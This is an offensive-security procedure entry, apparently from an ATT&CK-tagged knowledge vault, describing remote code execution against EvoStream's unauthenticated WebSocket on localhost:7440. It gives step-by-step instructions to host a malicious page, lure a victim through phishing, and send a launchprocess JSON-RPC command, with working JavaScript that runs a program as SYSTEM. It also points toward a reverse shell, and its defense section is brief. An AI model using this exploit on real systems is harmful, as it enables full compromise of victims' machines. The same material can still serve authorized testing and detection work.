---
id: proc-websocket-rce
tags:
  - rce
  - javascript
  - websocket
  - evostream
type: procedure
tools:
  - '[[tools/rce0923234.html]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/launchprocess-websocket]]'
verified: false
platforms:
  - Windows
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:30:58.560Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Remote-RCE-via-JavaScript-WebSocket-Payload

## Summary

This procedure enables remote code execution by hosting a malicious HTML page with JavaScript that connects to the EvoStream WebSocket on localhost:7440 and sends launchprocess commands, requiring user interaction to visit the page.

## Description

The EvoStream API supports WebSocket connections without authentication. A remote JavaScript payload can establish ws://localhost:7440, send JSON-RPC commands to execute binaries as SYSTEM. Combine with SSRF for non-interactive remote access.

## Requirements

1. Target user to visit malicious page (phishing/email)
2. Browser on target with JavaScript enabled
3. EvoStream WebSocket active on localhost:7440

## Defense

Defensive measures and detection strategies:

- Block or monitor WebSocket connections to localhost from web content
- Implement Content Security Policy (CSP) to restrict ws:// connections
- Educate users on phishing; monitor for anomalous browser network activity

## Objectives

1. Establish remote WebSocket connection via injected JS
2. Execute arbitrary commands as SYSTEM
3. Achieve full remote system compromise

## Instructions

### Step 1: Host Malicious Payload

**Context**: Serve the HTML file containing JS for WebSocket exploitation.

Use [[tools/rce0923234.html]] hosted on a web server.

### Step 2: Trigger WebSocket Connection and Command

**Context**: JavaScript in the page connects to ws://localhost:7440 and sends launchprocess.

**Command** ([[commands/launchprocess-websocket]]):
```javascript
const ws = new WebSocket('ws://localhost:7440'); ws.onopen = () => { ws.send(JSON.stringify({jsonrpc: '2.0', method: 'launchprocess', params: {appName: 'calc.exe'}, id: 1})); };
```

> Embed this in HTML. Expected output: WebSocket opens, command sent, calc.exe executes as SYSTEM. Check browser console for connection success.

### Step 3: Verify Remote Execution

**Context**: Confirm payload ran on target.

Observe target for calc.exe or use advanced payload like reverse shell.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/launchprocess-websocket]]

## Tools Used

- [[tools/rce0923234.html]]

## Tags

- rce
- javascript
